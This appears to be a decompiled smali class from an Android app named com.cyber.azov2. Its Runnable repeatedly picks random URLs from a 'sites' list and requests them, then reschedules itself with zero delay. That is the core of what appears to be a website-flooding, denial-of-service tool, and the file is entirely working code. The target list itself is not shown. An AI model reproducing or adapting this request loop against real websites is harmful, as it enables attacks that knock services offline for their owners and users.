.class Lcom/cyber/azov2/MainActivity$2;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/cyber/azov2/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/cyber/azov2/MainActivity;


# direct methods
.method constructor <init>(Lcom/cyber/azov2/MainActivity;)V
    .locals 0

    .line 67
    iput-object p1, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    const-wide/16 v0, 0x0

    .line 71
    :try_start_0
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/4 v3, 0x3

    .line 72
    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v3
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    add-int/lit8 v3, v3, 0x1

    const/4 v4, 0x0

    :goto_0
    if-ge v4, v3, :cond_0

    .line 76
    :try_start_1
    iget-object v5, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-static {v5}, Lcom/cyber/azov2/MainActivity;->-$$Nest$fgetsites(Lcom/cyber/azov2/MainActivity;)[Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-static {v6}, Lcom/cyber/azov2/MainActivity;->-$$Nest$fgetsites(Lcom/cyber/azov2/MainActivity;)[Ljava/lang/String;

    move-result-object v6

    array-length v6, v6

    invoke-virtual {v2, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    aget-object v5, v5, v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 81
    :try_start_2
    iget-object v6, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-virtual {v6, v5}, Lcom/cyber/azov2/MainActivity;->getUrlResponse(Ljava/lang/String;)Ljava/lang/String;

    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :catch_0
    move-exception v2

    .line 78
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 85
    iget-object v2, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-static {v2}, Lcom/cyber/azov2/MainActivity;->-$$Nest$fgethandler(Lcom/cyber/azov2/MainActivity;)Landroid/os/Handler;

    move-result-object v2

    invoke-virtual {v2, p0, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :cond_0
    iget-object v2, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-static {v2}, Lcom/cyber/azov2/MainActivity;->-$$Nest$fgethandler(Lcom/cyber/azov2/MainActivity;)Landroid/os/Handler;

    move-result-object v2

    invoke-virtual {v2, p0, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :catchall_0
    move-exception v2

    iget-object v3, p0, Lcom/cyber/azov2/MainActivity$2;->this$0:Lcom/cyber/azov2/MainActivity;

    invoke-static {v3}, Lcom/cyber/azov2/MainActivity;->-$$Nest$fgethandler(Lcom/cyber/azov2/MainActivity;)Landroid/os/Handler;

    move-result-object v3

    invoke-virtual {v3, p0, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 86
    throw v2
.end method
